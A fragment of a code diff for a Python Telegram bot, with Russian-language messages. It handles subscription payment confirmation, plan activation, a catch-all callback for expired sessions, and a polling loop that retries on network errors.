+            await cb.answer("\u274c \u0421\u0435\u0440\u0432\u0438\u0441 \u043d\u0435\u0434\u043e\u0441\u0442\u0443\u043f\u0435\u043d", show_alert=True)
+            return
+        status = (j.get("status") or "").lower()
+        plan_key = info.get("plan")
+        pay_user = info.get("user", cb.from_user.id)
+        d = j.get("data") or {}
+        if isinstance(d, dict) and d.get("kind") == "sub":
+            if d.get("plan") in SUB_PLANS:
+                plan_key = d["plan"]
+            try:
+                pay_user = int(d.get("tgId") or pay_user)
+            except (TypeError, ValueError):
+                pass
+        if status in ("paid", "confirmed", "success"):
+            if plan_key and SUB_PLANS.get(plan_key):
+                activate_plan(subs, pay_user, plan_key)
+            await cb.answer("\u2705 \u041e\u043f\u043b\u0430\u0442\u0430 \u043f\u0440\u043e\u0448\u043b\u0430, \u043f\u043e\u0434\u043f\u0438\u0441\u043a\u0430 \u0430\u043a\u0442\u0438\u0432\u043d\u0430!", show_alert=True)
+            s, until = sub_quality(subs, info["user"])
+            caption = (
+                bq(f"<b>{NAME}</b>  \u2014  \u041f\u043e\u0434\u043f\u0438\u0441\u043a\u0430 \u043e\u043a")
+                + f"\n\n\u2705 \u0421\u043e\u0441\u0442\u043e\u044f\u043d\u0438\u0435: <b>{s}</b> ({until})\n"
+                + "\u041c\u043e\u0436\u043d\u043e \u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u044c\u0441\u044f!"
+            )
+            await cb.message.edit_caption(caption=caption, parse_mode=ParseMode.HTML,
+                                          reply_markup=InlineKeyboardMarkup(inline_keyboard=[
+                                              [InlineKeyboardButton(text="\u25c0 \u041d\u0430\u0437\u0430\u0434", callback_data="back:home")],
+                                          ]))
+            return
+        await cb.answer(f"\u23f3 \u0441\u0442\u0430\u0442\u0443\u0441: {status or 'unknown'}", show_alert=True)
+    else:
+        subs = load_subs()
+        s, until = sub_quality(subs, cb.from_user.id)
+        if s in ("admin", "forever", "active"):
+            await cb.answer(f"\u2705 \u043f\u043e\u0434\u043f\u0438\u0441\u043a\u0430 \u043e\u043a: {until}", show_alert=True)
+        else:
+            await cb.answer("\u23f3 \u043e\u043f\u043b\u0430\u0442\u0430 \u043d\u0435 \u043d\u0430\u0439\u0434\u0435\u043d\u0430", show_alert=True)
+
+
+@router.callback_query(F.data == "menu:subs")
+async def menu_subs(cb: CallbackQuery, state: FSMContext):
+    await sub_shop(cb, state)
+# ── stale ───────────────────────────────────────────────
+@router.callback_query()
+async def stale_cb(cb: CallbackQuery):
+    await cb.answer("\u26a0\ufe0f \u0421\u0435\u0441\u0441\u0438\u044f \u0438\u0441\u0442\u0435\u043a\u043b\u0430. /start", show_alert=True)
+
+
+# ── run ─────────────────────────────────────────────────
+async def main():
+    if not BOT_TOKEN:
+        log.error("BOT_TOKEN missing")
+        return
+    dp = Dispatcher(storage=MemoryStorage())
+    dp.include_router(router)
+    n = len(load_sessions())
+    p = len(load_proxies())
+    log.info("%s starting... sessions=%d proxies=%d", NAME, n, p)
+
+    # retry the whole polling loop on network hiccups
+    while True:
+        bot = Bot(token=BOT_TOKEN)
+        try:
+            await dp.start_polling(bot)
+            break
+        except TelegramNetworkError as e:
+            log.error("network down: %s — retrying in 5s", e)
+            try:
+                await bot.session.close()
+            except Exception:
+                pass
+            await asyncio.sleep(5)
+        except Exception as e:
+            log.error("polling crashed: %s — retrying in 5s", e)
+            try:
+                await bot.session.close()
+            except Exception:
+                pass
+            await asyncio.sleep(5)
+
+
+if __name__ == "__main__":
+    asyncio.run(main())
